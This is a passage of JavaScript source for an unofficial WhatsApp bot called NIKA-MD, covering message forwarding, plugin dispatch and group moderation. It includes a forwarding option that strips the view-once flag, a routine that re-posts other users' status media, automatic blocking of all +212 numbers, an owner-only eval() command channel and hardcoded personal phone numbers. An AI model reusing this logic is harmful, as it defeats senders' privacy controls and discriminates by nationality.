list_reply[list_reply.caption? 'caption' : 'text'] = ( list_reply.title ? list_reply.title + '\n\n' : "" ) +  (list_reply.caption? list_reply.caption : list_reply.text) + '\n\n' + list_reply.buttonText + '\n\n' + await convertNumberList(list_reply.sections) + '\n\n' +list_reply.footer	
var t = { ...list_reply }
delete list_reply.sections
delete list_reply.footer
delete list_reply.buttonText
delete list_reply.title
const sentMessage = await conn.sendMessage(from, list_reply , options);	
const cmdArray = [];
t.sections.forEach((section) => {
    section.rows.forEach((row) => {
        cmdArray.push({ rowId: row.rowId, title: row.title });
    });
});
for ( let i = 0; i < cmdArray.length; i++) {	
await id_db.input_data(cmdArray[i].rowId ,cmdArray[i].title , sentMessage.key.id ) 
}}  
      

    

    	    
conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}

//============================for rvo================================================
        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message
                let mime = (message.msg || message).mimetype || ''
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
                const stream = await downloadContentFromMessage(quoted, messageType)
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                let type = await FileType.fromBuffer(buffer)
                trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
                    // save to file
                await fs.writeFileSync(trueFileName, buffer)
                return trueFileName
            }

conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message                             
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
}
	
if(senderNumber.includes("94710450435")){
if(isReact) return
m.react("🫟")
}
if(senderNumber.includes("94776769616")){
if(isReact) return
m.react("👥")
}
if(senderNumber.includes("94704694400")){
if(isReact) return
m.react("🙂")
}
if(senderNumber.includes("94725329411")){
if(isReact) return
m.react("😚")
}
if(senderNumber.includes("94703830990")){
if(isReact) return
m.react("🩵")
}
if(senderNumber.includes("94727319036")){
if(isReact) return
m.react("🥰")
}

//read commands
if (isCmd && config.READ_CMD === "true" && config.ALLWAYS_OFFLINE === "false") {
await conn.readMessages([mek.key])  // Mark command as read
}
//==============band user======((((((
const banbn = await fetchJson(`https://raw.githubusercontent.com/sulamd48/database/refs/heads/main/Banduser.json`)
const plynYnna = banbn.split(",")
const isBanUser = [ ...plynYnna ]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(sender)
const bandgroup = await fetchJson(`https://raw.githubusercontent.com//sulamd48/database/refs/heads/main/Bandgroup.json`);
const plyn = Array.isArray(bandgroup) ? bandgroup : ["120363150082064437"];
const isBanGroup = plyn
    .map((v) => v.replace(/[^0-9]/g, "") + "@g.us")
    .includes(sender); // group JID හෝ sender ගැලපේ නම් true

//================================WORK TYPE============================================ 
if(!isOwner && config.MODE === "private") return 
if(!isOwner && isGroup && config.MODE === "inbox") return 
if(!isOwner && !isGroup && config.MODE === "groups") return 

if ( isCmd && isBanUser ) return reply("❌ *𝐘𝐎𝐔 𝐀𝐑𝐄 𝐁𝐀𝐍𝐍𝐄𝐃 𝐅𝐑𝐎𝐌 𝐔𝐒𝐈𝐍𝐆 𝐍𝐈𝐊𝐀-𝐌𝐃...*\n\n*contact NIKA-MD Owner 94743826406 Remove your Ban* 🔖🫟\n")
//=====================================================================================
if ( isCmd && isBanGroup ) return 

        
            //==================================plugin map================================
         const events = require('./lib/command')
const cmdName = isCmd ?  command : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply ,config, isCreator , isDev, botNumber2 });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config ,isCreator , isDev, botNumber2 });
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body,  isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , config, isCreator , isDev, botNumber2 });
  }
});

      

	

//==================================================================

    //============================================================================ 
        

if(body === "send" || body === "Send" || body === "Seve" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
    // if(!m.quoted) return reply("*Please Mention status*")
    const data = JSON.stringify(mek.message, null, 2);
    const jsonData = JSON.parse(data);
    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
    if(!isStatus) return

    const getExtension = (buffer) => {
        const magicNumbers = {
            jpg: 'ffd8ffe0',
            png: '89504e47',
            mp4: '00000018',
        };
        const magic = buffer.toString('hex', 0, 4);
        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
    };

    if(m.quoted.type === 'imageMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.imageMessage.caption;
        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
    } else if(m.quoted.type === 'videoMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.videoMessage.caption;
        let buttonMessage = {
            video: fs.readFileSync("./" + ext),
            mimetype: "video/mp4",
            fileName: `${m.id}.mp4`,
            caption: caption ,
            headerType: 4
        };
        await conn.sendMessage(from, buttonMessage,{
            quoted: mek
        });
    }
}

//=====================================

//AUto Read Function By @Um4r719
conn.ev.on('messages.upsert', async (mek) => {
    try {
        mek = mek.messages[0];
        if (!mek.message) return;

        // Handle ephemeral messages
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
            ? mek.message.ephemeralMessage.message 
            : mek.message;

        // Auto-read functionality
        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]);  // Mark message as read
            //console.log(`Marked message from ${mek.key.remoteJid} as read.`);
        }

        // Continue with your existing message processing logic here...
        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const content = JSON.stringify(mek.message);
        const from = mek.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe 
            ? conn.user.id.split(':')[0] + '@s.whatsapp.net' 
            : mek.key.participant || mek.key.remoteJid;

        // More code...
    } catch (err) {
        console.error('Error in message handler:', err);
    }
});
	      
  //======================================================================
       if (config.ALLWAYS_OFFLINE === "true") {
        conn.sendPresenceUpdate('unavailable'); // Sets the bot's last seen status
    }

    if (senderNumber.startsWith('212') && config.BAD_NO_BLOCK === "true") {
        console.log(`Blocking number +212${senderNumber.slice(3)}...`);

        // Action: Either block the user or remove them from a group
        if (from.endsWith('@g.us')) {
            // If in a group, remove the user
            await conn.groupParticipantsUpdate(from, [sender], 'remove');
            await conn.sendMessage(from, { text: 'User with +212 number detected and removed from the group.' });
        } else {
            // If in a private chat, block the user
            await conn.updateBlockStatus(sender, 'block');
            console.log(`Blocked +212${senderNumber.slice(3)} successfully.`);
        }

        return; // Stop further processing of this message
    }

//=====================================

if (config.AUTO_BLOCK === "true" && mek.key.remoteJid.endsWith('@s.whatsapp.net')) {
    if (!mek.key.fromMe) { // Ensure the bot doesn't block itself
        console.log(`Auto-block initiated for ${mek.key.remoteJid}...`);

        try {
            // Send warnings
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 1 ❗*" });
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 2 ❗*" });
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 3 ❗*" });

            // Notify and block
            await conn.sendMessage(mek.key.remoteJid, { text: "*Blocked 🚫*" });
            await conn.updateBlockStatus(mek.key.remoteJid, 'block');

            console.log(`User ${mek.key.remoteJid} blocked after warnings.`);
        } catch (error) {
            console.error(`Error during auto-block for ${mek.key.remoteJid}:`, error);
        }

        return; // Stop further processing for this user
    }
}

if (config.ANTI_LINK == "true"){
        if (!isOwner && isGroup && isBotAdmins ) {   
        if (body.match(`chat.whatsapp.com`)) {
            
        if (isMe) return await reply("Link Derect but i can't Delete link")
        if(groupAdmins.includes(sender)) return
            
        await conn.sendMessage(from, { delete: mek.key })  
        }}}

const bad = await fetchJson(`https://raw.githubusercontent.com/sulamd48/database/refs/heads/main/bad_word.json`)
if (config.ANTI_BAD == "true"){
  if (!isAdmins && !isMe) {
  for (any in bad){
  if (body.toLowerCase().includes(bad[any])){  
    if (!body.includes('tent')) {
      if (!body.includes('docu')) {
        if (!body.includes('https')) {
  if (groupAdmins.includes(sender)) return 
  if (mek.key.fromMe) return   
  await conn.sendMessage(from, { delete: mek.key })  
  await conn.sendMessage(from , { text: '*Bad word detected..!*'})
//  await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}}}}}}
	      
 if (config.ANTI_BOT == "true"){
  if ( isGroup && !isAdmins && !isMe && !isOwner && isBotAdmins ) {
  if ( mek.id.startsWith("BAE") ) {
await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` 📚 *Removed By NIKA-MD* ❗\nAnti Bot System on..." })
if ( config.ANTI_BOT == "true" && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}
    if ( mek.id.startsWith("NIKA-MD") ) {
await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` *💃 NIKA-MD* ❗\n*Removed By NIKA-MD* ❗\nAnti Bot System on..." })
if ( config.ANTI_BOT == "true" && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}

  
  }
  }
  
//============================================================================
		    

//==================================================================	

	      
            switch (command) {
        case 'jid':
        reply(from)
        break
        
        default:				
        if (isOwner && body.startsWith('$')) {
        let bodyy = body.split('$')[1]
        let code2 = bodyy.replace("°", ".toString()");
        try {
        let resultTest = await eval(code2);
        if (typeof resultTest === "object") {
        reply(util.format(resultTest));
        } else {
        reply(util.format(resultTest));
        }
        } catch (err) {
        reply(util.format(err));
        }}}
        } catch (e) {
            const isError = String(e)
            console.log(isError)
        }
    })
}
app.get("/", (req, res) => {
res.send("𝐍𝐈𝐊𝐀-𝐌𝐃 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 👻");
});
app.listen(port, () => console.log(`SULA-MD Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);
